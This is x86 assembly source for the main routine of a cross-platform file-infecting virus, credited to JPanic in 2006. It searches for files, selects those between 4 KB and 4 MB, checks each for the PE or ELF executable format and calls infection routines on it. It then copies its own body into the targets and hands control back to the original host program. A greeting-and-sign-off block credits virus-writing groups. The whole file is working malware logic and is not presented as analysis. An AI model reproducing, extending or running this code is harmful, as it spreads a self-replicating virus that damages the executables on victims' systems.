;= Virus Main Procedure (c) 2006 JPanic ===================================
;
; The main virus routine.
;
; PUBLICS:
;	VMain()
;	dwOrigEIP	DWORD
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat

_VMAIN_ASM	EQU 	TRUE

include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\elf.inc
include vmain.ash
include osprocs.ash
include inf-pe.ash
include inf-elf.ash
	
;= Code Warez =============================================================
        include codeseg.ash
;= VMain ==================================================================
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC VMain
PUBLIC dwOrigEIP

VMain			PROC
			
			push	L 1234h
			org	$-4
	dwOrigEIP	dd	offset VHost
			pushf
			pushad
			cld
			call	@@delta
		@@delta:pop	ebx
			sub	esp,size _VirusHeap
			lea	ebp,[esp+7Fh]
			sub	ebx,(ofs @@delta - ofs VMain)
			mov	[vheap.dwVirusDelta],ebx
			call	Fill_Proc_Table
			call	dwo [vheap.dwVInit]
			jb	@@exit
			call	dwo [vheap.dwVFindFirst]			
		@@FindLoop:	jc	@@exit
				mov	[vheap.dwFileSize],ecx
				jecxz	@@FindNext
                                ;bsr   eax,ecx
                                db      0Fh,0BDh,0C1h
				cmp	al,12		; 4k min
				jb	@@FindNext
				cmp	al,22		; 4mb max
				jae	@@FindNext
				call	dwo [vheap.dwVOpenFile]
				jc	@@FindNext
				xchg	eax,ebx
				call	IsImagePE
				.if	ZERO?
					call	InfectPE
				.else
					cmp	dwo [ebx],ELF_MAGIC
					.if	ZERO?
						call	InfectELF
					.endif
				.endif
				call	dwo [vheap.dwVCloseFile]
			@@FindNext:
				call	dwo [vheap.dwVFindNext]
				jmp	@@FindLoop
			@@FindDone:
			call	dwo [vheap.dwVFindClose]
		@@exit: lea	esp,[ebp + size _VirusHeap - 07Fh]
			popad
			popf
			ret
			
VMain			ENDP

;--------------------------------------------------------------------------
PUBLIC BuildVBody

BuildVBody              PROC
                        ; Copy virus, Set dwOrigEIP=eax, OS_Proc_Switch=dl                        
			push	edi             ; Save new virus body offset.            
			mov	ecx,VSize
			mov	esi,dwo [vheap.dwVirusDelta]
			rep	movsb
			pop	esi             ; ESI = virus body
			; Correct Virus Image.			
			mov	dwo [esi+1],eax
			mov	by [(esi-VCode).OS_Proc_Switch],dl
                        ret

BuildVBody              ENDP

;==========================================================================
; Text Strings
                        db      VName," (c) 2006 JPanic:",0Dh,0Ah
                        db      "This is Sepultura signing off...",0Dh,0Ah
                        db      "This is The Soul Manager saying goodbye...",0Dh,0Ah
                        db      "Greetz to: Immortal Riot, #RuxCon!",0

;==========================================================================
                        ENDS
			END	VMain
;==========================================================================
